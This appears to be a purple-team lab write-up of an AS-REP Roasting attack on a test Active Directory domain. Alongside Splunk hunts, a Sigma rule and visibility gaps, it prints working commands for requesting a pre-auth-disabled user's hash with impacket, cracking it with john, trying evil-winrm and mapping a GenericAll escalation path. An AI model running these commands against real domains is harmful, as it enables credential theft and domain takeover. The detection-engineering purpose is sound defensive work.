# ATK-004 — AS-REP Roasting Full Kill Chain
**Sprint:** 1 | **Date:** 2026-04-25 | **Status:** COMPLETE  
**MITRE ATT&CK:** T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting  
**Detection Rate: 2/4 (50%)**

---

## 1. Overview

AS-REP Roasting exploits Active Directory accounts that have Kerberos pre-authentication disabled (`DoesNotRequirePreAuth = True`). When pre-authentication is disabled, the DC will respond to an AS-REQ with an AS-REP containing data encrypted with the user's password hash — without verifying the requester's identity first. An attacker can request this ticket for any such account and crack the hash offline to recover the plaintext password.

**Target:** `jdoe` (Jane Doe) — domain user with pre-authentication disabled  
**Attacker position:** Valid domain user (`jsmith:Password123!`) obtained from ATK-002  
**Tool:** `impacket-GetNPUsers`  
**Key difference from ATK-003 (Kerberoasting):** Kerberoasting requires valid credentials AND targets service accounts with SPNs. AS-REP Roasting only needs to know the username — no credentials required for the target account itself.

---

## 2. Kill Chain Narrative

The attacker already holds `jsmith:Password123!` from the ATK-002 SMB relay. Using jsmith as a foothold, they query DC01 for accounts with pre-authentication disabled. DC01 responds to the AS-REQ for `jdoe` with an AS-REP blob encrypted with jdoe's NTLM hash — no questions asked. The attacker takes the blob offline, cracks it in under one second with john, and recovers `Password123!`. Although jdoe lacks WinRM access to DC01, the real impact is jdoe's `GenericAll` ACL right over `jsmith` — a privilege escalation path that leads directly into the ATK-006 DCSync chain.

---

## 3. Comparison: ATK-004 vs Previous Attacks

| Property | ATK-003 Kerberoasting | ATK-004 AS-REP Roasting |
|---|---|---|
| Pre-requisite | Valid domain creds | Username only (no creds needed for target) |
| Target account type | Service accounts with SPNs | User accounts with pre-auth disabled |
| Hash type | `$krb5tgs$` (TGS-REP) | `$krb5asrep$` (AS-REP) |
| Hashcat mode | `-m 13100` | `-m 18200` |
| DC event generated | EC4769 | EC4768 Pre-Auth Type=0 |
| Offline crackable | ✅ Yes | ✅ Yes |
| Visibility gap | VIS-005 (LDAP enum silent) | Same — enumeration silent |

---

## 4. Kill Chain Stages

### Stage 1 — Pre-Attack Verification

**On DC01 (PowerShell) — confirm misconfiguration:**
```powershell
Get-ADUser jdoe -Properties DoesNotRequirePreAuth | Select Name, DoesNotRequirePreAuth
```

**Result:**
```
Name     DoesNotRequirePreAuth
----     ---------------------
Jane Doe                  True
```

**Detection:** ❌ None — AD attribute query generates no Security event log entry.

---

### Stage 2 — AS-REP Hash Request (Kali)

**Command:**
```bash
impacket-GetNPUsers corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request -outputfile /tmp/jdoe.hash
```

**Result:**
```
Name  MemberOf                                    PasswordLastSet             LastLogon  UAC      
----  ------------------------------------------  --------------------------  ---------  --------
jdoe  CN=IT-Staff,OU=CorpGroups,DC=corp,DC=local  2026-03-26 17:51:32.674639  <never>    0x410200 

$krb5asrep$23$jdoe@CORP.LOCAL:47be3bbf2dc923b27a77d7dfb8c5f974$49c51cd301b3b67e75fd49b9ee5cb840
5b34783882ec1b5ee10c88e4bc1e489e1bea8b11ab50a3af9f6a1980bfb46ed18084c92d683955b1c581b79b17347d
3139b26865b715600e62229b90ada480d3711ad00f4678071adc08287c9aee142c17f0a73adcc5b1f9a77d3df1f9847
88f64f4ebfe0bcbc9581d8cb8779806ba1d65a9bf9952f6aa6e9ea00a160c7f9455e9d2267d9ce958b561e8b2cd9f4d
55491b4a89b2de82492d795b63407e50ae5abf273f82023c7e017fa0a952b52213f8e9a38a1604a450a1ed1029ca3ce
18ab0f49e44c727d3ca4ea76a7619f70fda6ac43a8ea94121c3a7
```

**Detection:** ✅ EC4768 generated on DC01 with `Pre_Authentication_Type = 0`

---

### Stage 3 — Offline Hash Cracking (Kali)

**Command:**
```bash
john --format=krb5asrep --wordlist=/tmp/corp_wordlist.txt /tmp/jdoe.hash
```

**Result:**
```
Password123!     ($krb5asrep$23$jdoe@CORP.LOCAL)
1g 0:00:00:00 DONE — 100.0g/s
```

**Cracked:** `jdoe:Password123!`  
**Detection:** ❌ None — offline operation. VIS-003 (accepted gap).

---

### Stage 4 — Authentication Attempt + Impact Proof

**WinRM attempt (blocked — jdoe not in Remote Management Users):**
```bash
evil-winrm -i 10.10.10.40 -u jdoe -p 'Password123!'
# Result: WinRM::WinRMAuthorizationError
```

**Detection:** ❌ No EC4624 generated (connection rejected before logon)

**Impact proof — GenericAll ACL over jsmith (DC01 PowerShell):**
```powershell
(Get-ACL "AD:$(Get-ADUser jsmith)").Access | Where-Object {$_.IdentityReference -like "*jdoe*"}
```

**Result:**
```
ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
AccessControlType     : Allow
IdentityReference     : CORP\jdoe
IsInherited           : False
```

**Impact:** jdoe can reset jsmith's password, add jsmith to any group, or grant jsmith DCSync rights — direct path to full domain compromise via ATK-006.

**Detection:** ❌ No event generated for ACL enumeration.

---

## 5. SOC Hunt

### T1 Triage — Morning Check

```spl
index=windows EventCode=4768
| search _raw="*Pre-Authentication*0x0*" OR Pre_Authentication_Type=0
| table _time, Account_Name, Client_Address, Pre_Authentication_Type
| sort -_time
```

**Result:** 1 event — `jdoe` from `::ffff:10.10.10.99` at `2026-04-25 19:30:24`  ✅

### T2 Investigation — Full Kali Timeline

```spl
index=windows
| search Client_Address="::ffff:10.10.10.99"
| table _time, EventCode, Account_Name, Service_Name, Pre_Authentication_Type
| sort _time
```

**Result:** EC4768, jdoe, Service=krbtgt, Pre-Auth=0 — confirms automated AS-REP request from Linux attacker IP. ✅

### T2 — jdoe Auth Activity

```spl
index=windows EventCode=4624
| search Account_Name="jdoe"
| table _time, Account_Name, src_ip, Logon_Type
| sort -_time
```

**Result:** 14 events, Logon_Type=3, src_ip blank — domain Kerberos noise + failed WinRM attempts. src_ip blank due to Kerberos logon format (no "Source Network Address" field). ⚠️ Partial

### Full Incident Timeline Query

```spl
index=windows earliest="2026-04-25 19:29:00" latest="2026-04-25 19:37:00"
| search Account_Name="jdoe" OR Client_Address="::ffff:10.10.10.99"
| table _time, EventCode, Account_Name, Client_Address, Pre_Authentication_Type, Logon_Type
| sort _time
```

---

## 6. Detections Built

| # | Detection | SPL / Method | Event ID | Status |
|---|---|---|---|---|
| DET-004-01 | AS-REP request with pre-auth disabled | EC4768 + Pre_Authentication_Type=0 | 4768 | ✅ Validated — 1 hit |
| DET-004-02 | AS-REP from non-DC Linux IP | EC4768 + Client_Address contains ffff:10.10.10.99 | 4768 | ✅ Validated |
| DET-004-03 | jdoe ACL abuse path | Manual AD ACL review | N/A | ⚠️ No auto-detection |

---

## 7. Visibility Gaps

| ID | Gap | Impact | Fix |
|---|---|---|---|
| VIS-003 | Offline cracking undetectable | Hash cracked silently | Accepted — prevent hash theft upstream |
| VIS-005 | Account enumeration via LDAP silent | GetNPUsers enum leaves no log | Honeypot accounts + LDAP audit logging (Sprint 4) |
| VIS-006 (new) | ACL enumeration generates no Security event | GenericAll path invisible to Splunk | Enable advanced AD auditing — Object Access (Sprint 4) |

---

## 8. Sigma Rule

```yaml
title: AS-REP Roasting — Kerberos Pre-Authentication Disabled Request
id: atk004-asrep-roasting-corp
status: test
description: >
  Detects AS-REP roasting attack — a Kerberos AS-REQ where pre-authentication
  is not required (type 0x0). Indicates account misconfiguration being exploited
  to obtain an offline-crackable hash without valid credentials.
author: CorpLab
date: 2026-04-25
tags:
  - attack.credential_access
  - attack.t1558.004
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
  filter_dc:
    IpAddress|startswith:
      - '::ffff:10.10.10.40'
      - '::ffff:10.10.10.1'
  condition: selection and not filter_dc
falsepositives:
  - Legacy systems that do not support Kerberos pre-authentication
  - Misconfigured service accounts (should be remediated)
level: high
fields:
  - EventID
  - TargetUserName
  - IpAddress
  - PreAuthType
```

**SPL Translation:**
```spl
index=windows EventCode=4768 Pre_Authentication_Type=0
| where NOT match(Client_Address, "::ffff:10\.10\.10\.(40|1)$")
| table _time, Account_Name, Client_Address, Pre_Authentication_Type
| sort -_time
```

---

## 9. MITRE ATT&CK Mapping

| Tactic | Technique | Sub-technique | ID | Detected |
|---|---|---|---|---|
| Credential Access | Steal or Forge Kerberos Tickets | AS-REP Roasting | T1558.004 | ✅ EC4768 |
| Credential Access | Brute Force | Password Cracking | T1110.002 | ❌ Offline |
| Privilege Escalation | Abuse Elevation Control Mechanism | — | T1068 (ACL path) | ❌ No logging |

**Sprint 1 cumulative detection rate:**

| Attack | Stages | Detected | Rate |
|---|---|---|---|
| ATK-001 LLMNR Kill Chain | 7 | 5 | 71% |
| ATK-002 SMB Relay | 3 | 1 | 33% |
| ATK-003 Kerberoasting | 4 | 2 | 50% |
| ATK-004 AS-REP Roasting | 4 | 2 | 50% |
| **Total Sprint 1 so far** | **18** | **10** | **56%** |

---

## 10. Lessons Learned

1. **Pre-auth disabled = free hash** — no credentials needed for the target account. Any domain user can request it, making this extremely low-noise from an attacker perspective.
2. **EC4768 Pre-Auth=0 is a high-fidelity alert** — legitimate systems almost never generate this. One hit = investigate immediately.
3. **WinRM access ≠ cracked account success** — impact must be evaluated via ACL rights and privilege paths, not just shell access.
4. **GenericAll is a full privilege escalation path** — jdoe → jsmith → DCSync is a complete domain compromise chain from one cracked unprivileged user.
5. **src_ip blank in EC4624 for Kerberos logons** — props.conf extraction works on NTLM events but Kerberos logons format the source differently. Needs a separate extraction rule.
6. **Save hashes and wordlists to ~/corplab/** — /tmp does not survive reboots.

---

## 11. Next Attack Preview — ATK-005 BloodHound AD Enumeration

**Target:** corp.local entire domain graph  
**Tool:** BloodHound + SharpHound collector  
**What it does:** Maps every ACL, group membership, and privilege path in the domain visually — finds the jdoe→jsmith→DCSync path automatically  
**Detection:** EC4662 (Object Access) if AD auditing enabled, otherwise largely silent  
**VMs needed:** Kali + DC01 + blue-vm

---

## Appendix A — ATK-004.json

```json
{
  "attack_id": "ATK-004",
  "name": "AS-REP Roasting",
  "sprint": 1,
  "date": "2026-04-25",
  "status": "complete",
  "mitre": {
    "tactic": "Credential Access",
    "technique": "Steal or Forge Kerberos Tickets",
    "sub_technique": "AS-REP Roasting",
    "technique_id": "T1558.004"
  },
  "target": {
    "account": "jdoe",
    "domain": "corp.local",
    "dc_ip": "10.10.10.40",
    "misconfiguration": "DoesNotRequirePreAuth = True"
  },
  "attacker": {
    "host": "kali",
    "ip": "10.10.10.99",
    "foothold_creds": "jsmith:Password123!"
  },
  "stages": [
    {
      "stage": 1,
      "name": "Account enumeration",
      "tool": "impacket-GetNPUsers",
      "command": "impacket-GetNPUsers corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request -outputfile /tmp/jdoe.hash",
      "result": "AS-REP hash captured for jdoe",
      "detected": true,
      "event_id": "4768",
      "pre_auth_type": "0"
    },
    {
      "stage": 2,
      "name": "Offline hash cracking",
      "tool": "john",
      "command": "john --format=krb5asrep --wordlist=/tmp/corp_wordlist.txt /tmp/jdoe.hash",
      "result": "Password123! recovered",
      "detected": false,
      "gap": "VIS-003"
    },
    {
      "stage": 3,
      "name": "Authentication attempt",
      "tool": "evil-winrm",
      "command": "evil-winrm -i 10.10.10.40 -u jdoe -p 'Password123!'",
      "result": "WinRMAuthorizationError — jdoe not in Remote Management Users",
      "detected": false
    },
    {
      "stage": 4,
      "name": "ACL abuse path confirmed",
      "tool": "Get-ACL (PowerShell)",
      "command": "(Get-ACL \"AD:$(Get-ADUser jsmith)\").Access | Where-Object {$_.IdentityReference -like \"*jdoe*\"}",
      "result": "GenericAll confirmed: CORP\\jdoe over jsmith",
      "detected": false,
      "gap": "VIS-006"
    }
  ],
  "credentials_recovered": {
    "account": "jdoe",
    "password": "Password123!",
    "hash_type": "krb5asrep",
    "hash_mode": 18200
  },
  "detection_rate": "2/4 (50%)",
  "visibility_gaps": ["VIS-003", "VIS-005", "VIS-006"],
  "next_attack": "ATK-005 BloodHound AD Enumeration"
}
```

---

## Appendix B — sigma_asrep_roasting_T1558.004.yml

```yaml
title: AS-REP Roasting — Kerberos Pre-Authentication Disabled Request
id: atk004-asrep-roasting-corp
status: test
description: >
  Detects AS-REP roasting attack — a Kerberos AS-REQ where pre-authentication
  is not required (type 0x0). Indicates account misconfiguration being exploited
  to obtain an offline-crackable hash without valid credentials.
author: CorpLab
date: 2026-04-25
tags:
  - attack.credential_access
  - attack.t1558.004
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
  filter_dc:
    IpAddress|startswith:
      - '::ffff:10.10.10.40'
      - '::ffff:10.10.10.1'
  condition: selection and not filter_dc
falsepositives:
  - Legacy systems that do not support Kerberos pre-authentication
  - Misconfigured service accounts (should be remediated)
level: high
fields:
  - EventID
  - TargetUserName
  - IpAddress
  - PreAuthType
```
